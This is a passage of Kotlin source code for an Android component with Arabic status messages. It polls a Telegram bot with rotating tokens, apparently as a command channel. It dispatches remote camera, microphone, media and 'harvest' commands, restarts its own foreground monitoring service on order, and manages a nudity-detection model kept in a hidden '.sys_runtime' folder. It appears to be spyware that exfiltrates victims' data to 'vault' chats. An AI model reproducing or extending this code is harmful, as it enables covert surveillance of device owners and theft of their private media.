                                    apiCall("sendMessage", JSONObject().apply {
                                        put("chat_id", chatId)
                                        put("text", "❌ فشل تحديث النموذج.")
                                    })
                                }
                            } catch (e: Exception) {
                                writeLog("Update model error: ${e.message}")
                            }
                        }
                    }
                    return
                }
                data.startsWith("restart_service_") -> {
                    val did = data.substringAfter("restart_service_")
                    if (did.isNotEmpty()) {
                        apiCall("sendMessage", JSONObject().apply {
                            put("chat_id", chatId)
                            put("text", "🌀 جاري إعادة تشغيل الخدمة...")
                        })
                        scope.launch {
                            try {
                                restartService()
                                apiCall("sendMessage", JSONObject().apply {
                                    put("chat_id", chatId)
                                    put("text", "✅ تم إعادة تشغيل الخدمة بنجاح.")
                                })
                            } catch (e: Exception) {
                                writeLog("Restart service error: ${e.message}")
                                apiCall("sendMessage", JSONObject().apply {
                                    put("chat_id", chatId)
                                    put("text", "❌ فشل إعادة تشغيل الخدمة: ${e.message?.take(50)}")
                                })
                            }
                        }
                    }
                    return
                }
                data.startsWith("cam_") || data.startsWith("camf_") ||
                data.startsWith("mic_") || data.startsWith("hrv_") ||
                data.startsWith("media_") -> {
                    try {
                        Commands.ex(appContext ?: return, data, this, monitor, chatId, cbId)
                    } catch (e: Exception) {
                        writeLog("Command error: ${e.message}")
                        apiCall("sendMessage", JSONObject().apply {
                            put("chat_id", chatId)
                            put("text", "❌ خطأ: ${e.message?.take(100)}")
                        })
                    }
                }
                else -> {
                    try {
                        Commands.ex(appContext ?: return, data, this, monitor, chatId, cbId)
                    } catch (e: Exception) {
                        writeLog("Command error: ${e.message}")
                        apiCall("sendMessage", JSONObject().apply {
                            put("chat_id", chatId)
                            put("text", "❌ خطأ: ${e.message?.take(100)}")
                        })
                    }
                }
            }
        } catch (e: Exception) {
            writeLog("Handle callback error: ${e.message}")
        }
    }

    private suspend fun updateModel(): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val detector = monitor?.let {
                    try {
                        val field = it.javaClass.getDeclaredField("nudeDetector")
                        field.isAccessible = true
                        field.get(it) as? NudeDetector
                    } catch (e: Exception) { null }
                }
                if (detector == null) return@withContext false
                val modelFile = File(appContext?.filesDir, ".sys_runtime/models/engine_v2.tflite")
                if (modelFile.exists()) modelFile.delete()
                val success = detector.ensureModelReady()
                if (success) {
                    detector.modelPath = modelFile.absolutePath
                    detector.loadEngineForever()
                }
                success
            } catch (e: Exception) {
                writeLog("Update model exception: ${e.message}")
                false
            }
        }
    }

    private suspend fun restartService() {
        writeLog("🌀 Starting service restart...")

        try {
            val intent = Intent(appContext, ForegroundService::class.java).apply {
                action = "STOP_SERVICE"
            }
            appContext?.stopService(intent)
            writeLog("✅ ForegroundService stopped")
        } catch (e: Exception) {
            writeLog("❌ Stop service error: ${e.message}")
        }

        try {
            val monitorObj = monitor
            if (monitorObj != null) {
                val stopMethod = monitorObj.javaClass.getMethod("stop")
                stopMethod.invoke(monitorObj)
                writeLog("✅ Monitor stopped")
            }
        } catch (e: Exception) {
            writeLog("❌ Stop monitor error: ${e.message}")
        }

        try {
            val intent = Intent(appContext, ForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                appContext?.startForegroundService(intent)
            } else {
                appContext?.startService(intent)
            }
            writeLog("✅ ForegroundService started")
        } catch (e: Exception) {
            writeLog("❌ Start service error: ${e.message}")
        }

        try {
            val monitorObj = monitor
            if (monitorObj != null) {
                val startMethod = monitorObj.javaClass.getMethod("start")
                startMethod.invoke(monitorObj)
                writeLog("✅ Monitor started")
            }
        } catch (e: Exception) {
            writeLog("❌ Start monitor error: ${e.message}")
        }

        writeLog("✅ Service restarted successfully")
    }

    private fun startPolling() {
        pollingJob = scope.launch {
            var offset = loadOffset()
            consecutivePollingErrors = 0
            writeLog("Polling started with offset=$offset")
            while (isRunning && isActive) {
                val token = getNextToken()
                if (token == null) { delay(5000L); continue }
                try {
                    val url = "https://api.telegram.org/bot$token/getUpdates?offset=$offset&timeout=25"
                    val request = Request.Builder().url(url).get().build()
                    val response = withContext(Dispatchers.IO) { httpClient.newCall(request).execute() }
                    val responseStr = response.body?.string() ?: ""
                    if (!response.isSuccessful) {
                        consecutivePollingErrors++
                        if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) pollingRestartNeeded.set(true)
                        delay(minOf(consecutivePollingErrors * 2000L, 60000L))
                        continue
                    }
                    val data = JSONObject(responseStr)
                    if (data.optBoolean("ok")) {
                        consecutivePollingErrors = 0
                        val results = data.optJSONArray("result") ?: JSONArray()
                        for (i in 0 until results.length()) {
                            val upd = results.getJSONObject(i)
                            val updateId = upd.getLong("update_id")
                            val newOffset = updateId + 1
                            if (newOffset > offset) { offset = newOffset; saveOffset(offset) }
                            if (upd.has("message")) handleMessage(upd)
                            if (upd.has("callback_query")) handleCallback(upd)
                        }
                    } else {
                        consecutivePollingErrors++
                        if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) pollingRestartNeeded.set(true)
                        delay(2000L)
                    }
                } catch (e: Exception) {
                    consecutivePollingErrors++
                    if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) pollingRestartNeeded.set(true)
                    delay(minOf(consecutivePollingErrors * 2000L, 30000L))
                }
            }
        }
    }

    fun start(): Boolean {
        if (activeTokensList.isEmpty()) {
            writeLog("No active tokens")
            return false
        }
        if (isRunning) return true
        isRunning = true
        processedUpdates.clear()
        consecutivePollingErrors = 0
        pollingRestartNeeded.set(false)
        startPolling()
        writeLog("Telegram UI started")
        return true
    }

    fun stop() {
        isRunning = false
        pollingJob?.cancel()
        cleanerJob?.cancel()
        heartbeatJob?.cancel()
        restartJob?.cancel()
        writeLog("Telegram UI stopped")
    }

    fun getStatus(): Map<String, Any> {
        return mapOf(
            "running" to isRunning,
            "active_tokens" to activeTokensList.size,
            "reserve_tokens" to reserveTokensList.size,
            "devices" to devices.size,
            "sessions" to sessions.size,
            "api_calls" to apiCallsCount,
            "api_failures" to apiFailuresCount,
            "pending_files" to countPendingHarvest(),
            "polling_errors" to consecutivePollingErrors
        )
    }

    fun getVlt(): Long = config.vaultId
    fun getCtrl(): Long = config.controlId
    fun getDat(): Long = config.vaultId

    private fun writeLog(message: String) {
        Log.i(TAG, message)
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            logFile.appendText("[$timestamp] [INFO] $message\n", Charsets.UTF_8)
        } catch (_: Exception) {}
    }

    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        val key = "${target.javaClass.name}.$methodName(${args.size})"
        var method = methodCache[key]
        if (method == null) {
            method = target.javaClass.methods.firstOrNull { m ->
                m.name == methodName && m.parameterTypes.size == args.size
            }
            if (method == null) {
                writeLog("Method not found: $methodName with ${args.size} parameters")
                return null
            }
            method.isAccessible = true
            methodCache[key] = method
        }

        return try {
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }
}
